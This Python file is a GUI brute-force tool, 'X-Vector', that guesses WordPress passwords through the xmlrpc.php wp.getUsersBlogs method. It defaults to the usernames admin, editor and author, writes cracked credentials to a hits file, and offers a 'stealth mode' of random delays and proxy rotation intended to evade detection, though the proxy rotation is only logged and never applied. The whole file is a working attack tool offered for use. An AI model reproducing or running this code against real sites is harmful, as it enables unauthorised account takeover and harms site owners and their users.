import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import json
import os
import time
import random
import xmlrpc.client
import itertools
import logging

# === Setup Logging ===
logging.basicConfig(
    filename="xvector_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
HITS_FILE = os.path.join(BASE_DIR, "logs", "hits.txt")
SESSION_FILE = os.path.join(BASE_DIR, "logs", "session.json")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")


class BruteForcer:
    def __init__(self):
        # Global state variables replaced by instance members
        self.start_time = None
        self.attempt_counter = 0
        self.abort_flag = threading.Event()
        self.pause_flag = threading.Event()
        self.server = None

    def log_message(self, message, level="info"):
        colors = {"info": "white", "success": "green", "error": "red", "warning": "orange"}
        color = colors.get(level, "white")
        log_box.configure(state="normal")
        log_box.insert("end", f"{message}\n", color)
        log_box.see("end")
        log_box.configure(state="disabled")

        if level == "success":
            logging.info(message)
        elif level == "error":
            logging.error(message)
        elif level == "warning":
            logging.warning(message)
        else:
            logging.info(message)

    def validate_inputs(self, target, usernames, wordlist_path):
        if not target or not usernames or not wordlist_path:
            messagebox.showerror("Input Error", "Please fill in all required fields.")
            return False
        if not os.path.isfile(wordlist_path):
            messagebox.showerror("File Error", "Password wordlist file not found.")
            return False
        return True

    def pause_check(self):
        # Wait here if the pause flag is set
        while self.pause_flag.is_set():
            time.sleep(0.1)

    def run(self, target, usernames, wordlist_path, proxylist_path, stealth_mode, min_delay, max_delay):
        # Reset state
        self.abort_flag.clear()
        self.pause_flag.clear()
        self.attempt_counter = 0
        self.start_time = time.time()

        if not self.validate_inputs(target, usernames, wordlist_path):
            return

        try:
            with open(wordlist_path, 'r', encoding="utf-8") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            messagebox.showerror("File Error", f"Could not read password file:\n{e}")
            return

        proxies = []
        if stealth_mode and os.path.isfile(proxylist_path):
            try:
                with open(proxylist_path, 'r', encoding="utf-8") as pf:
                    proxies = [p.strip() for p in pf if p.strip()]
                proxy_cycle = itertools.cycle(proxies)
            except Exception as e:
                self.log_message(f"[!] Proxy list error: {e}", "error")

        resume_index = 0
        if os.path.exists(SESSION_FILE):
            if messagebox.askyesno("Resume Session?", "Previous session found. Resume?"):
                try:
                    with open(SESSION_FILE, "r", encoding="utf-8") as sf:
                        session_data = json.load(sf)
                        resume_index = session_data.get("resume_index", 0)
                        self.log_message(f"[*] Resuming session at attempt #{resume_index}", "info")
                except Exception as e:
                    self.log_message(f"[!] Could not resume session: {e}", "error")

        try:
            self.server = xmlrpc.client.ServerProxy(target)
        except Exception as e:
            self.log_message(f"[!] Could not connect to target: {e}", "error")
            return

        hit_found = False

        for idx, user in enumerate(usernames):
            self.log_message(f"\n[*] Trying user: {user}", "info")
            for pwd_idx, password in enumerate(passwords):
                if self.abort_flag.is_set():
                    self.log_message("[!] Attack aborted!", "warning")
                    return

                self.pause_check()

                current_attempt = idx * len(passwords) + pwd_idx

                if current_attempt < resume_index:
                    continue

                try:
                    if stealth_mode and proxies:
                        current_proxy = next(proxy_cycle)
                        self.log_message(f"[*] Using proxy: {current_proxy}", "info")
                    resp = self.server.wp.getUsersBlogs(user, password)
                    self.attempt_counter += 1

                    if resp:
                        hit = f"[+] SUCCESS: {user}:{password}"
                        self.log_message(hit, "success")
                        with open(HITS_FILE, "a", encoding="utf-8") as hf:
                            hf.write(hit + "\n")
                        hit_found = True
                        break

                except xmlrpc.client.Fault:
                    self.attempt_counter += 1
                    pass
                except Exception as e:
                    self.log_message(f"[!] Error on {user}:{password} -> {e}", "error")
                    break

                try:
                    with open(SESSION_FILE, "w", encoding="utf-8") as sf:
                        json.dump({"resume_index": current_attempt}, sf)
                except Exception as e:
                    self.log_message(f"[!] Session save error: {e}", "error")

                if stealth_mode:
                    delay = random.uniform(min_delay, max_delay)
                    self.log_message(f"[*] Sleeping {delay:.2f}s", "info")
                    time.sleep(delay)

            if hit_found:
                break

        try:
            if os.path.exists(SESSION_FILE):
                os.remove(SESSION_FILE)
        except Exception:
            pass

        if hit_found:
            messagebox.showinfo("Done", "Brute-force completed! Credentials found.")
        else:
            messagebox.showinfo("Done", "Brute-force completed. No valid credentials found.")

        self.log_message("\n[*] Brute-force completed.", "success")


# === Helper UI Functions ===

def browse_file(entry_widget, filetypes):
    path = filedialog.askopenfilename(filetypes=filetypes)
    if path:
        entry_widget.delete(0, "end")
        entry_widget.insert(0, path)


def update_speed():
    while not brute_forcer.abort_flag.is_set():
        elapsed = (time.time() - brute_forcer.start_time) if brute_forcer.start_time else 1
        speed = brute_forcer.attempt_counter / elapsed
        speed_label.configure(text=f"Speed: {speed:.2f} req/sec")
        time.sleep(1)


def start_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()
    proxylist_path = proxy_entry.get().strip()
    stealth_mode = stealth_var.get()
    try:
        min_delay = float(min_delay_entry.get())
        max_delay = float(max_delay_entry.get())
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for delay values.")
        return

    threading.Thread(
        target=brute_forcer.run,
        args=(target, usernames, wordlist_path, proxylist_path, stealth_mode, min_delay, max_delay),
        daemon=True
    ).start()


def abort_attack():
    brute_forcer.abort_flag.set()
    brute_forcer.log_message("[!] Brute force aborted by user.", "warning")


def pause_attack():
    brute_forcer.pause_flag.set()
    brute_forcer.log_message("[*] Brute force paused.", "info")


def resume_attack():
    brute_forcer.pause_flag.clear()
    brute_forcer.log_message("[*] Brute force resumed.", "info")


# === GUI Setup ===

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer (Pro)")
app.geometry("800x750")
app.resizable(False, False)

padding = {"pady": (5, 0)}

# Target and username inputs
ctk.CTkLabel(app, text="Target URL (e.g., https://example.com/xmlrpc.php)").pack(**padding)
target_entry = ctk.CTkEntry(app, width=750)
target_entry.pack(pady=5)

ctk.CTkLabel(app, text="Usernames (one per line)").pack(**padding)
usernames_box = ctk.CTkTextbox(app, height=80, width=750)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack(pady=5)

# File selectors
ctk.CTkLabel(app, text="Password Wordlist File").pack(**padding)
wordlist_frame = ctk.CTkFrame(app)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=600)
wordlist_entry.pack(side="left", padx=5)
ctk.CTkButton(wordlist_frame, text="Browse", command=lambda: browse_file(wordlist_entry, [("Text files", "*.txt")])).pack(side="left")

ctk.CTkLabel(app, text="Proxy List (Optional)").pack(**padding)
proxy_frame = ctk.CTkFrame(app)
proxy_frame.pack()
proxy_entry = ctk.CTkEntry(proxy_frame, width=600)
proxy_entry.pack(side="left", padx=5)
ctk.CTkButton(proxy_frame, text="Browse", command=lambda: browse_file(proxy_entry, [("Text files", "*.txt")])).pack(side="left")

# Stealth mode and delay configuration
stealth_var = ctk.BooleanVar()
ctk.CTkCheckBox(app, text="Enable Stealth Mode (Random Delay + Proxy Rotation)", variable=stealth_var).pack(**padding)

delay_frame = ctk.CTkFrame(app)
delay_frame.pack(pady=5)
ctk.CTkLabel(delay_frame, text="Min Delay (s):").pack(side="left", padx=2)
min_delay_entry = ctk.CTkEntry(delay_frame, width=60)
min_delay_entry.insert(0, "1.0")
min_delay_entry.pack(side="left", padx=2)
ctk.CTkLabel(delay_frame, text="Max Delay (s):").pack(side="left", padx=2)
max_delay_entry = ctk.CTkEntry(delay_frame, width=60)
max_delay_entry.insert(0, "3.5")
max_delay_entry.pack(side="left", padx=2)

# Control buttons including Pause/Resume
button_frame = ctk.CTkFrame(app)
button_frame.pack(pady=10)

ctk.CTkButton(button_frame, text="Start Brute Force", fg_color="green", hover_color="darkgreen", command=start_brute_force).pack(side="left", padx=5)
ctk.CTkButton(button_frame, text="Pause", fg_color="yellow", hover_color="gold", command=pause_attack).pack(side="left", padx=5)
ctk.CTkButton(button_frame, text="Resume", fg_color="blue", hover_color="darkblue", command=resume_attack).pack(side="left", padx=5)
ctk.CTkButton(button_frame, text="Abort", fg_color="red", hover_color="darkred", command=abort_attack).pack(side="left", padx=5)

# Log output
ctk.CTkLabel(app, text="Output Log").pack()
log_box = ctk.CTkTextbox(app, height=250, width=750, state="disabled")
log_box.pack(pady=(0, 10))

# Speed label
speed_label = ctk.CTkLabel(app, text="Speed: 0.00 req/sec")
speed_label.pack(pady=(0, 10))

brute_forcer = BruteForcer()
threading.Thread(target=update_speed, daemon=True).start()

app.mainloop()
